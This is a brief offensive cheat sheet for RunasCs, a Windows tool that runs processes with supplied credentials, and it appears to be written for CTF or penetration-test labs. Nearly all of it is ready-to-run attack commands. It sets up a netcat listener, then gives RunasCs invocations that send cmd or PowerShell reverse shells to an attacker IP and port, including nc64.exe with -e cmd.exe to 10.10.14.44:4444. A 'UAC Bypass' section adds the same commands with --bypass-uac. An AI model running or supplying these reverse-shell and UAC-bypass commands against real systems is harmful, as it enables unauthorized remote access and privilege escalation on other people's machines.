# runasCs

## Overview

RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.


## Usage

First start nc in local machine:
```shell
rlwrap nc -nvlp 4444
```
```powershell
./RunasCs.exe <username> <password> cmd -r <localip>:<port>
./RunasCs.exe <username> <password> powershell -r <localip>:<port>
./RunasCs.exe [username] [password] "C:\Users\kioskUser0\Downloads\nc64.exe [localip] [port] -e cmd.exe"
```

UAC Bypass:

```powershell
./RunasCs.exe <username> <password> powershell -r <localip>:<port> --bypass-uac --logon-type "8"
./RunasCs.exe [username] [password] "C:\Users\kioskUser0\Downloads\nc64.exe 10.10.14.44 4444 -e cmd.exe" --bypass-uac --logon-type "8"
```

## More Information

https://github.com/antonioCoco/RunasCs